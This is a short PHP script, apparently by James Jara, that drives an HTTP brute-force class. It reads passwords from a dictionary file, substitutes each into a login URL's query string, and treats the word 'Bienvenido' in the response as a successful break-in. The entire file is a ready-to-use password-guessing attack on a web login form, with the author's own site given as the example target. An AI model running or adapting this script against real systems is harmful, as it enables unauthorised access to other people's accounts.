<?php
/*
create by jamesjara
23 de mayo
james jara
jamesjara.com

computer society latam, costa rica

*/
include("bruteforcehttp_class.php");

$partytime = new bruteForceHTTP();

$partytime->setDebug(true);

$partytime->setDictionary('dictionary.txt');

// Use this comodin {PASSWORD} 
$partytime->setAccessUrl('http://www.jamesjara.com/?myusername=jamesjara&mypassword={PASSWORD}&Submit=Login');

$partytime->setTimeOut(10);

//if this word match in the result, then you are in
$partytime->setBingoKeyword('Bienvenido');

$partytime->KillerTime();